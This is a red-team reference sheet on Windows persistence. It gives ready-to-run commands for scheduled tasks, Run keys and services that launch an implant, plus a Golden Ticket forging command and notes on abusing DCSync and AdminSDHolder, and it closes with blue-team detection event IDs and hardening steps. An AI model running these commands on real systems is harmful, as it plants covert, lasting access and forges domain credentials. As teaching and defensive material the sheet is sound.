---
title: "Windows Persistence"
category: "red-team"
tags: ["persistence", "windows"]
platform: "windows"
mitre: ["T1547", "T1053.005", "T1136"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Windows Persistence

## TL;DR
Autostart (Run keys), scheduled tasks, services, WMI event subs, startup folder. AD: Golden/Silver Ticket, DCSync, AdminSDHolder.

## Local
```powershell
# Scheduled task
schtasks /create /tn "Updater" /tr "C:\Windows\Temp\impl.exe" /sc onlogon /ru SYSTEM

# Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Upd /d "C:\...\impl.exe"

# Service
sc create updater binpath= "C:\...\impl.exe" start= auto

# WMI event subscription (fileless, survives reboot)
# __EventFilter + __EventConsumer + FilterToConsumerBinding
```

## Domain (post-compromise)
```text
Golden Ticket   – TGT signed with the krbtgt hash (any user, any privileges)
Silver Ticket   – TGS for a specific service (service/host account hash)
DCSync rights   – grant replication to a low-priv user -> dump hashes on demand
AdminSDHolder   – modify the ACL -> reapplied every 60 min on protected groups
```
```bash
# Golden ticket (Impacket)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator
```

## Detection (Blue Team)
- Event **7045** (service), **4698** (task), Run-key changes, WMI **5861**.
- Golden Ticket: TGT with an unusually long lifetime / non-existent user; no 4768 preceding 4769.
- **4720** (new account), AdminSDHolder ACL changes.

## Mitigation / Hardening
- Regular **krbtgt** rotation (twice), monitor WMI subs, autostart baseline.
- Protect Tier 0 accounts, alert on DCSync (4662 with replication rights for a non-DC).

## Sources
- [MITRE Persistence](https://attack.mitre.org/tactics/TA0003/)
